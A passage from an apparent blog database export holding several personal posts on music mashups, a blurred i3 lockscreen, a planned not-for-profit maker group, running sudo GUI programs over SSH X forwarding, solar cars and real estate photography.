criticism, though I do enjoy a vigorous dialectic, even if the endpoint is highlighting my own mistake.\\n\\nSome of my better art will also make it onto posts here, though the quality is not guaranteed to be much better than a middle school trapper-keeper’s graffiti. Enjoy at your own risk.\\n\\nI’m always open to mashup suggestions. Feel free to comment what you’d like to hear but have no way of making yourself, and I’ll see what I can come up with. In the future, I may post video tutorials on my methods (they’re pretty simple, but require heavy time investments as a result, and may not be useful in professional contexts).\\n\\n**Relevant links (will be updated in the future)**\\n\\n[SoundCloud](https://soundcloud.com/virtualdragon)\\n\\n[This is where I make awful images using someone else’s rendition of the Deep Dream ANN software](https://dreamscopeapp.com/u/DracSept)\\n\\n[Old deviantART junk](http://connectionpoint.deviantart.com/)\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]--><audio class=\"wp-audio-shortcode\" controls=\"controls\" id=\"audio-212-1\" preload=\"none\" style=\"width: 100%;\"><source src=\"https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3?_=1\" type=\"audio/mpeg\"></source>[https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3](https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3)</audio>Here’s Owen’s lil den in the back of TAMS. Right now I don’t have a lot of time to actually contribute written content, so for the time being this will mostly just serve as THE place to find all of the mashups, mix sets, and soundclowns I’ve made over the years. I’m in the process of migrating everything currently hosted on my SoundCloud page (linked below) over here so I can showcase only my best and more recent stuff over there, because who has the money to pay for SoundCloud Pro if they’re not actually in the music business?\n<p>In the future, I hope to add my ramblings on the various intersections of philosophy, neuroscience (as misunderstood by a college dropout-cum-pharmacology-hobbyist), chemistry, pharmacology (damnit, I already mentioned that), consciousness and the various theories of it’s characteristics and origins (I’m partial to Hofstadter’s “Strange Loop” theory of attention loops, full disclosure), bioinformatics, and various topics contained by the transhumanist perspective, as well as ideas pertaining to the analysis of various perspectives as it relates to finding the “truthiest truth,” which of course brings us right back to philosophy. In short, hot air.</p>\n<p>I will attempt to highlight my own biases in my writing so that my meanings can remain as clear as possible (refer back to “Linguistics is Broken” for a starting exploration as to why this is even worth attempting), and at some point I’ll add as full an analysis of my own proclivities as is manageable from within my own head. References will be included wherever possible, but please, if you spot any inconsistency, unfounded claim, or straight-up incomprehensible bullshit in anything I’ve written, don’t hesitate to point it out in a comment! I don’t respond violently to criticism, though I do enjoy a vigorous dialectic, even if the endpoint is highlighting my own mistake.</p>\n<p>Some of my better art will also make it onto posts here, though the quality is not guaranteed to be much better than a middle school trapper-keeper’s graffiti. Enjoy at your own risk.</p>\n<p>I’m always open to mashup suggestions. Feel free to comment what you’d like to hear but have no way of making yourself, and I’ll see what I can come up with. In the future, I may post video tutorials on my methods (they’re pretty simple, but require heavy time investments as a result, and may not be useful in professional contexts).</p>\n<p><strong>Relevant links (will be updated in the future)</strong></p>\n<p><a href=\"https://soundcloud.com/virtualdragon\">SoundCloud</a></p>\n<p><a href=\"https://dreamscopeapp.com/u/DracSept\">This is where I make awful images using someone else’s rendition of the Deep Dream ANN software</a></p>\n<p><a href=\"http://connectionpoint.deviantart.com/\">Old deviantART junk</a></p>\n</div>","amp":"212","plaintext":"[https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3](https://blog.tams.tech/wp-content/uploads/2017/02/Baited-FML-Remix.mp3)\nHere’s Owen’s lil den in the back of TAMS. Right now I don’t have a lot of time\nto actually contribute written content, so for the time being this will mostly\njust serve as THE place to find all of the mashups, mix sets, and soundclowns\nI’ve made over the years. I’m in the process of migrating everything currently\nhosted on my SoundCloud page (linked below) over here so I can showcase only my\nbest and more recent stuff over there, because who has the money to pay for\nSoundCloud Pro if they’re not actually in the music business?In the future, I\nhope to add my ramblings on the various intersections of philosophy,\nneuroscience (as misunderstood by a college dropout-cum-pharmacology-hobbyist),\nchemistry, pharmacology (damnit, I already mentioned that), consciousness and\nthe various theories of it’s characteristics and origins (I’m partial to\nHofstadter’s “Strange Loop” theory of attention loops, full disclosure),\nbioinformatics, and various topics contained by the transhumanist perspective,\nas well as ideas pertaining to the analysis of various perspectives as it\nrelates to finding the “truthiest truth,” which of course brings us right back\nto philosophy. In short, hot air.\n\nI will attempt to highlight my own biases in my writing so that my meanings can\nremain as clear as possible (refer back to “Linguistics is Broken” for a\nstarting exploration as to why this is even worth attempting), and at some point\nI’ll add as full an analysis of my own proclivities as is manageable from within\nmy own head. References will be included wherever possible, but please, if you\nspot any inconsistency, unfounded claim, or straight-up incomprehensible\nbullshit in anything I’ve written, don’t hesitate to point it out in a comment!\nI don’t respond violently to criticism, though I do enjoy a vigorous dialectic,\neven if the endpoint is highlighting my own mistake.\n\nSome of my better art will also make it onto posts here, though the quality is\nnot guaranteed to be much better than a middle school trapper-keeper’s graffiti.\nEnjoy at your own risk.\n\nI’m always open to mashup suggestions. Feel free to comment what you’d like to\nhear but have no way of making yourself, and I’ll see what I can come up with.\nIn the future, I may post video tutorials on my methods (they’re pretty simple,\nbut require heavy time investments as a result, and may not be useful in\nprofessional contexts).\n\nRelevant links (will be updated in the future)\n\nSoundCloud [https://soundcloud.com/virtualdragon]\n\nThis is where I make awful images using someone else’s rendition of the Deep\nDream ANN software [https://dreamscopeapp.com/u/DracSept]\n\nOld deviantART junk [http://connectionpoint.deviantart.com/]","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5b8ea0547623330001332617","created_at":"2017-02-20T23:13:23.000Z","created_by":"1","updated_at":"2017-02-20T23:13:23.000Z","updated_by":"1","published_at":"2017-02-20T23:13:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277b","uuid":"ea69a79f-c7b4-4382-a7e5-15940ea050c8","title":"A quick update on my blurred lockscreen","slug":"temp-slug-23","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI was browsing some i3-related forum the other day and I saw people discussing the benefit of using imagemagick’s ‘-scale’ function instead of ‘-blur’. According to those I saw there, using ‘-scale 10% -scale 1000%’ was much faster than the ‘-blur 4×1000’ like I use. So I tested this, by making a duplicate script, then running the two to compare, using the “time” command in linux (which I just discovered recently while looking for the “date” command’s default function — duh!) to see how long each took.\\n\\nUsing the pixellation effect was slightly faster, but only by a little. The scaling took 3.274 seconds, as opposed to 4.339 seconds for the regular lock script. While both of these take a relatively long time compared to…well, anything I do on this machine, I don’t really see why it matters how quickly your lockscreen loads. I mean, maybe if you’re trying to hide something on your screen, but if you’re doing that then you should be obscuring things a little more than a simple blur anyway.\\n\\nAlso, I was thinking of having it update every-so-often so that if I get messages or something else changes on the screen while it’s locked, it will change so I can see it but it’s still blurred. The problem is, I don’t want to tie up my CPU for 5 seconds every minute (any less than a minute wouldn’t really be useful), and on top of that the imagemagick screenshot feature makes two quick beeps from my motherboard. I don’t mind that when I hit the lock button, but if that went off once a minute, it would get annoying really quick!\\n\\nAnyway, the whole point of this is to say that I don’t really see the necessity in speed for this function so I’ve decided to stick with the ‘blur’ effect.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I was browsing some i3-related forum the other day and I saw people discussing the benefit of using imagemagick’s ‘-scale’ function instead of ‘-blur’. According to those I saw there, using ‘-scale 10% -scale 1000%’ was much faster than the ‘-blur 4×1000’ like I use. So I tested this, by making a duplicate script, then running the two to compare, using the “time” command in linux (which I just discovered recently while looking for the “date” command’s default function — duh!) to see how long each took.</p>\n<p>Using the pixellation effect was slightly faster, but only by a little. The scaling took 3.274 seconds, as opposed to 4.339 seconds for the regular lock script. While both of these take a relatively long time compared to…well, anything I do on this machine, I don’t really see why it matters how quickly your lockscreen loads. I mean, maybe if you’re trying to hide something on your screen, but if you’re doing that then you should be obscuring things a little more than a simple blur anyway.</p>\n<p>Also, I was thinking of having it update every-so-often so that if I get messages or something else changes on the screen while it’s locked, it will change so I can see it but it’s still blurred. The problem is, I don’t want to tie up my CPU for 5 seconds every minute (any less than a minute wouldn’t really be useful), and on top of that the imagemagick screenshot feature makes two quick beeps from my motherboard. I don’t mind that when I hit the lock button, but if that went off once a minute, it would get annoying really quick!</p>\n<p>Anyway, the whole point of this is to say that I don’t really see the necessity in speed for this function so I’ve decided to stick with the ‘blur’ effect.</p>\n</div>","amp":"204","plaintext":"I was browsing some i3-related forum the other day and I saw people discussing\nthe benefit of using imagemagick’s ‘-scale’ function instead of ‘-blur’.\nAccording to those I saw there, using ‘-scale 10% -scale 1000%’ was much faster\nthan the ‘-blur 4×1000’ like I use. So I tested this, by making a duplicate\nscript, then running the two to compare, using the “time” command in linux\n(which I just discovered recently while looking for the “date” command’s default\nfunction — duh!) to see how long each took.\n\nUsing the pixellation effect was slightly faster, but only by a little. The\nscaling took 3.274 seconds, as opposed to 4.339 seconds for the regular lock\nscript. While both of these take a relatively long time compared to…well,\nanything I do on this machine, I don’t really see why it matters how quickly\nyour lockscreen loads. I mean, maybe if you’re trying to hide something on your\nscreen, but if you’re doing that then you should be obscuring things a little\nmore than a simple blur anyway.\n\nAlso, I was thinking of having it update every-so-often so that if I get\nmessages or something else changes on the screen while it’s locked, it will\nchange so I can see it but it’s still blurred. The problem is, I don’t want to\ntie up my CPU for 5 seconds every minute (any less than a minute wouldn’t really\nbe useful), and on top of that the imagemagick screenshot feature makes two\nquick beeps from my motherboard. I don’t mind that when I hit the lock button,\nbut if that went off once a minute, it would get annoying really quick!\n\nAnyway, the whole point of this is to say that I don’t really see the necessity\nin speed for this function so I’ve decided to stick with the ‘blur’ effect.","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-21T01:07:30.000Z","created_by":"1","updated_at":"2017-02-21T01:07:30.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277c","uuid":"22220fe4-9797-4464-aad0-7b31d2547c43","title":"What is The Association of Mad Scientists?","slug":"__trashed","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThe Association, simply put, is a group of people dedicated to benefiting humanity through technological advancement and scientific study. We are a not-for-profit organization, but we do intend to make a profit. Allow me first to explain what I mean by that, and then discuss the ways in which we intend to go about this goal.\\n\\nFirstly, it should me mentioned that not all not-for-profit organizations are charities. Rolex, for example, is a non-profit business, as is Mozilla, Canonical, and others. The Association, however, is more ambitious than those companies who exist to create a single product, while still maintaining openness and a genuine care for our customers that can’t be replicated in a for-profit business. The reason for that is simple to understand, but not something intuitive — that is, you probably won’t just think of this concept unless you regularly think about the problems that plague our economy. The idea is, that instead of creating good products as a side-effect of having the goal of being profitable, but to turn that on its head and be profitable as a side-effect of creating good products.\\n\\nThat’s the entire reason while I’ll be forming The Association of Mad Scientists as a not-for-profit organization – it legally binds us to being dedicated to the goal of creating truly high-quality products, rather than having quality products being a mere side effect of being profitable. I have seen too many times when “generic” brands are simply tricks by name brands to try to get you to spend more money on something slightly cheaper but worth *much* less. Any hardware product created by The Association will have a license which gives you (first of all) the right to modify said hardware for your own or for any not-for-profit reason, and (secondly) will give you three purchase choices — the complete product, fully assembled; a kit of all the parts; and a fully open design and specification datasheet. Well, that is, many products will be available in that way, some will only be available as designs, but designs will be available for all products. This, in addition to our not-for-profit goal of benefiting our customers and humanity in general, guarantees you have the permission and ability to fix any of our products, that replacement parts will be available, and that if you don’t have the money to buy any of our completed products you can simply download the free designs and build one from a few inexpensive parts purchased on our site, or better yet, some recycled pieces from your own collection.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>The Association, simply put, is a group of people dedicated to benefiting humanity through technological advancement and scientific study. We are a not-for-profit organization, but we do intend to make a profit. Allow me first to explain what I mean by that, and then discuss the ways in which we intend to go about this goal.</p>\n<p>Firstly, it should me mentioned that not all not-for-profit organizations are charities. Rolex, for example, is a non-profit business, as is Mozilla, Canonical, and others. The Association, however, is more ambitious than those companies who exist to create a single product, while still maintaining openness and a genuine care for our customers that can’t be replicated in a for-profit business. The reason for that is simple to understand, but not something intuitive — that is, you probably won’t just think of this concept unless you regularly think about the problems that plague our economy. The idea is, that instead of creating good products as a side-effect of having the goal of being profitable, but to turn that on its head and be profitable as a side-effect of creating good products.</p>\n<p>That’s the entire reason while I’ll be forming The Association of Mad Scientists as a not-for-profit organization – it legally binds us to being dedicated to the goal of creating truly high-quality products, rather than having quality products being a mere side effect of being profitable. I have seen too many times when “generic” brands are simply tricks by name brands to try to get you to spend more money on something slightly cheaper but worth <em>much</em> less. Any hardware product created by The Association will have a license which gives you (first of all) the right to modify said hardware for your own or for any not-for-profit reason, and (secondly) will give you three purchase choices — the complete product, fully assembled; a kit of all the parts; and a fully open design and specification datasheet. Well, that is, many products will be available in that way, some will only be available as designs, but designs will be available for all products. This, in addition to our not-for-profit goal of benefiting our customers and humanity in general, guarantees you have the permission and ability to fix any of our products, that replacement parts will be available, and that if you don’t have the money to buy any of our completed products you can simply download the free designs and build one from a few inexpensive parts purchased on our site, or better yet, some recycled pieces from your own collection.</p>\n</div>","amp":"232","plaintext":"The Association, simply put, is a group of people dedicated to benefiting\nhumanity through technological advancement and scientific study. We are a\nnot-for-profit organization, but we do intend to make a profit. Allow me first\nto explain what I mean by that, and then discuss the ways in which we intend to\ngo about this goal.\n\nFirstly, it should me mentioned that not all not-for-profit organizations are\ncharities. Rolex, for example, is a non-profit business, as is Mozilla,\nCanonical, and others. The Association, however, is more ambitious than those\ncompanies who exist to create a single product, while still maintaining openness\nand a genuine care for our customers that can’t be replicated in a for-profit\nbusiness. The reason for that is simple to understand, but not something\nintuitive — that is, you probably won’t just think of this concept unless you\nregularly think about the problems that plague our economy. The idea is, that\ninstead of creating good products as a side-effect of having the goal of being\nprofitable, but to turn that on its head and be profitable as a side-effect of\ncreating good products.\n\nThat’s the entire reason while I’ll be forming The Association of Mad Scientists\nas a not-for-profit organization – it legally binds us to being dedicated to the\ngoal of creating truly high-quality products, rather than having quality\nproducts being a mere side effect of being profitable. I have seen too many\ntimes when “generic” brands are simply tricks by name brands to try to get you\nto spend more money on something slightly cheaper but worthmuch  less. Any\nhardware product created by The Association will have a license which gives you\n(first of all) the right to modify said hardware for your own or for any\nnot-for-profit reason, and (secondly) will give you three purchase choices — the\ncomplete product, fully assembled; a kit of all the parts; and a fully open\ndesign and specification datasheet. Well, that is, many products will be\navailable in that way, some will only be available as designs, but designs will\nbe available for all products. This, in addition to our not-for-profit goal of\nbenefiting our customers and humanity in general, guarantees you have the\npermission and ability to fix any of our products, that replacement parts will\nbe available, and that if you don’t have the money to buy any of our completed\nproducts you can simply download the free designs and build one from a few\ninexpensive parts purchased on our site, or better yet, some recycled pieces\nfrom your own collection.","feature_image":null,"featured":0,"page":1,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-02-21T03:46:08.000Z","created_by":"1","updated_at":"2017-02-21T03:46:08.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277d","uuid":"ccdcb4fa-e80e-4c86-9c5c-0348970d9d30","title":"Running remote GUI programs that require root access","slug":"running-root-commands-over-ssh-with-x-support","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI recently discovered the ssh -X feature and thought it was a very nice and clever way of using remote access for GUI applications. Unfortunately, until today I’ve been limited to only working with applications that can be run without root access, because every time I tried to run a root (sudo) command, it would throw an error. For example.\\n\\n```\\nscott@webserver:~$ sudo geany<br></br>\\nX11 connection rejected because of wrong authentication.<br></br>\\nGeany: cannot open display```\\n\\nHonestly, it wasn’t even surprising. Of course, when changing users, you change users with Xauthority. What I was surprised to find, though, was no real information on how to solve this problem on the internet. It turns out that sudo does not preserve evironment variables, unless you set an option. So now, I simply run  \\n`scott@webserver:~$ sudo -E geany<br></br>`which preserves the environment variables for the session and allows you to open `sudo`ed programs over the SSH. In ` man sudo ` you are warned of the security risks of forwarding environment variables, so be sure you trust both machines. To be honest I don’t quite understand the implications of allowing this action, and would love some information on what sort of potential security risks this poses in the comment section below.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I recently discovered the ssh -X feature and thought it was a very nice and clever way of using remote access for GUI applications. Unfortunately, until today I’ve been limited to only working with applications that can be run without root access, because every time I tried to run a root (sudo) command, it would throw an error. For example.</p>\n<pre><code>scott@webserver:~$ sudo geany&lt;br&gt;&lt;/br&gt;\nX11 connection rejected because of wrong authentication.&lt;br&gt;&lt;/br&gt;\nGeany: cannot open display```\n\nHonestly, it wasn’t even surprising. Of course, when changing users, you change users with Xauthority. What I was surprised to find, though, was no real information on how to solve this problem on the internet. It turns out that sudo does not preserve evironment variables, unless you set an option. So now, I simply run  \n`scott@webserver:~$ sudo -E geany&lt;br&gt;&lt;/br&gt;`which preserves the environment variables for the session and allows you to open `sudo`ed programs over the SSH. In ` man sudo ` you are warned of the security risks of forwarding environment variables, so be sure you trust both machines. To be honest I don’t quite understand the implications of allowing this action, and would love some information on what sort of potential security risks this poses in the comment section below.\n\n\n</code></pre>\n</div>","amp":"237","plaintext":"I recently discovered the ssh -X feature and thought it was a very nice and\nclever way of using remote access for GUI applications. Unfortunately, until\ntoday I’ve been limited to only working with applications that can be run\nwithout root access, because every time I tried to run a root (sudo) command, it\nwould throw an error. For example.\n\nscott@webserver:~$ sudo geany<br></br>\nX11 connection rejected because of wrong authentication.<br></br>\nGeany: cannot open display```\n\nHonestly, it wasn’t even surprising. Of course, when changing users, you change users with Xauthority. What I was surprised to find, though, was no real information on how to solve this problem on the internet. It turns out that sudo does not preserve evironment variables, unless you set an option. So now, I simply run  \n`scott@webserver:~$ sudo -E geany<br></br>`which preserves the environment variables for the session and allows you to open `sudo`ed programs over the SSH. In ` man sudo ` you are warned of the security risks of forwarding environment variables, so be sure you trust both machines. To be honest I don’t quite understand the implications of allowing this action, and would love some information on what sort of potential security risks this poses in the comment section below.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-04-09T04:09:09.000Z","created_by":"1","updated_at":"2017-04-09T04:09:09.000Z","updated_by":"1","published_at":"2017-04-09T04:09:09.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277e","uuid":"f75e13b2-3883-4e0f-afe2-7281012faa90","title":"The Solar Car","slug":"temp-slug-26","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI’ve had many people who were discussing tech with me and electric cars have come up. Several times, this has led to questions of a ‘solar car’ — a car that can run on the power it receives from the sunlight that hits it. Personally, I have always hypothesized this to be a mathematical impossibility, but I figured I should do the calculations once and for all.\\n\\nBefore I begin, I should lay down some basic foundation for how I’m going to calculate this. A car consumes power at a rate that can be measured in either horsepower or watts. It uses that energy to move the weight of the car. Batteries add weight to a vehicle, so it becomes an issue of adding more weight to a vehicle by adding batteries versus losing acceleration power by adding more weight. The more efficient and lighter a battery/electric-motor-combination can be, the better it can utilize the available power (measureable in HP/Watts/Amperes per hour). However, if a vehicle is charged via solar there is a hard limit on how much energy is absorbed because of the surface area of the roof of the car is limited.\\n\\nAlternatively, you could utilize the solar panels to merely extend the range of “EV mode” if you have a hybrid, or to power your sick subwoofer or even a winch. It wouldn’t be entirely useless to *add* solar panels to these systems, but\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I’ve had many people who were discussing tech with me and electric cars have come up. Several times, this has led to questions of a ‘solar car’ — a car that can run on the power it receives from the sunlight that hits it. Personally, I have always hypothesized this to be a mathematical impossibility, but I figured I should do the calculations once and for all.</p>\n<p>Before I begin, I should lay down some basic foundation for how I’m going to calculate this. A car consumes power at a rate that can be measured in either horsepower or watts. It uses that energy to move the weight of the car. Batteries add weight to a vehicle, so it becomes an issue of adding more weight to a vehicle by adding batteries versus losing acceleration power by adding more weight. The more efficient and lighter a battery/electric-motor-combination can be, the better it can utilize the available power (measureable in HP/Watts/Amperes per hour). However, if a vehicle is charged via solar there is a hard limit on how much energy is absorbed because of the surface area of the roof of the car is limited.</p>\n<p>Alternatively, you could utilize the solar panels to merely extend the range of “EV mode” if you have a hybrid, or to power your sick subwoofer or even a winch. It wouldn’t be entirely useless to <em>add</em> solar panels to these systems, but</p>\n</div>","amp":"235","plaintext":"I’ve had many people who were discussing tech with me and electric cars have\ncome up. Several times, this has led to questions of a ‘solar car’ — a car that\ncan run on the power it receives from the sunlight that hits it. Personally, I\nhave always hypothesized this to be a mathematical impossibility, but I figured\nI should do the calculations once and for all.\n\nBefore I begin, I should lay down some basic foundation for how I’m going to\ncalculate this. A car consumes power at a rate that can be measured in either\nhorsepower or watts. It uses that energy to move the weight of the car.\nBatteries add weight to a vehicle, so it becomes an issue of adding more weight\nto a vehicle by adding batteries versus losing acceleration power by adding more\nweight. The more efficient and lighter a battery/electric-motor-combination can\nbe, the better it can utilize the available power (measureable in\nHP/Watts/Amperes per hour). However, if a vehicle is charged via solar there is\na hard limit on how much energy is absorbed because of the surface area of the\nroof of the car is limited.\n\nAlternatively, you could utilize the solar panels to merely extend the range of\n“EV mode” if you have a hybrid, or to power your sick subwoofer or even a winch.\nIt wouldn’t be entirely useless toadd  solar panels to these systems, but","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-04-09T05:08:53.000Z","created_by":"1","updated_at":"2017-04-09T05:08:53.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133277f","uuid":"76fb2792-f525-496e-832c-7d445dda6125","title":"Real Estate Photography -- My first assignment","slug":"real-estate-photography-my-first-assignment","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nIn July of 2016 I found an ad (probably on craigslist) for a freelance photographer needed. I immediately emailed the position and was more than pleased to receive a very nicely paid assignment. The work was thoroughly enjoyable, and I have had the pleasure of doing four contracts now for this same company (as of February 2017). I simply wanted to take this opportunity to showcase a few of my favorite photos from my time shooting the properties they requested I shoot.\\n\\nA few kind words they offered me in response to one of these assignments:\\n\\n> The photos were of good quality, with lots of angles to choose from even for the ‘no access’ properties. Good framing skills, consistent white balance.  \\n>  Great job! 🙂\\n\\n<div class=\\\"gallery galleryid-222 gallery-columns-3 gallery-size-medium\\\" id=\\\"gallery-9\\\"><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3190-300x154.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4755-300x203.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2818-300x200.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon portrait\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2912-203x300.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4492-300x203.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2824-300x216.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4363-300x199.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2349-300x160.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_1937-300x223.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon portrait\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2462-238x300.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3040-300x200.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2741-300x173.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2699-300x200.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4249-1024x753-300x221.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4213-1-300x200.jpg)</div></figure><figure class=\\\"gallery-item\\\"><div class=\\\"gallery-icon landscape\\\">![](https://madscientists.co/wp-content/uploads/2017/09/4249-300x221.jpg)</div></figure></div> \\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>In July of 2016 I found an ad (probably on craigslist) for a freelance photographer needed. I immediately emailed the position and was more than pleased to receive a very nicely paid assignment. The work was thoroughly enjoyable, and I have had the pleasure of doing four contracts now for this same company (as of February 2017). I simply wanted to take this opportunity to showcase a few of my favorite photos from my time shooting the properties they requested I shoot.</p>\n<p>A few kind words they offered me in response to one of these assignments:</p>\n<blockquote>\n<p>The photos were of good quality, with lots of angles to choose from even for the ‘no access’ properties. Good framing skills, consistent white balance.<br>\nGreat job! 🙂</p>\n</blockquote>\n<div class=\"gallery galleryid-222 gallery-columns-3 gallery-size-medium\" id=\"gallery-9\"><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3190-300x154.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4755-300x203.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2818-300x200.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon portrait\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2912-203x300.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4492-300x203.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2824-300x216.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4363-300x199.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2349-300x160.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_1937-300x223.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon portrait\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2462-238x300.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_3040-300x200.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2741-300x173.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/DSC_2699-300x200.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4249-1024x753-300x221.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4213-1-300x200.jpg)</div></figure><figure class=\"gallery-item\"><div class=\"gallery-icon landscape\">![](https://madscientists.co/wp-content/uploads/2017/09/4249-300x221.jpg)</div></figure></div> \n<p></p>\n</div>","amp":"222","plaintext":"In July of 2016 I found an ad (probably on craigslist) for a freelance\nphotographer needed. I immediately 